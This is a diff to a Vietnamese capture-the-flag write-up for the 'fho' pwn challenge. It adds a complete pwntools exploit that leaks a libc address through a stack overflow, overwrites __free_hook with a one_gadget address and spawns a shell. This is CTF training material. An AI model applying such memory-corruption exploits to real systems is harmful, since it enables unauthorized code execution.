@@ -41,7 +41,6 @@ Gọi system:
 # Script Python (Gọi system)
 
     #!/usr/bin/env python3
-    
     from pwn import *
     
     exe = ELF("./fho_patched")
@@ -49,7 +48,6 @@ Gọi system:
     ld = ELF("./ld-2.27.so")
     
     context.binary = exe
-    
     p=process(exe.path)
     
     p.sendlineafter(b'Buf: ',b'A'*0x48)
@@ -73,6 +71,25 @@ Vì điều kiện `[rsp+0x40] = NULL` thỏa nên có thể dùng one_gadget th
 
 Gọi one_gadget:
 
+    #!/usr/bin/env python3
+    from pwn import *
+    
+    exe = ELF("./fho_patched")
+    libc = ELF("./libc-2.27.so")
+    ld = ELF("./ld-2.27.so")
+    
+    context.binary = exe
+    p=process(exe.path)
+    
+    p.sendlineafter(b'Buf: ',b'A'*0x48)
+    p.recvuntil(b'A'*0x48)
+    libc.leak=u64(p.recv(6)+b'\x00\x00')
+    libc.address=libc.leak-0x21b0a
+    
+    one_gadget=libc.address+0x4f432
+    
     p.sendlineafter(b'To write: ',str(libc.sym['__free_hook']).encode())
     p.sendlineafter(b'With: ',str(one_gadget).encode())
     p.sendlineafter(b'To free: ',p64(0))
+    
+    p.interactive()
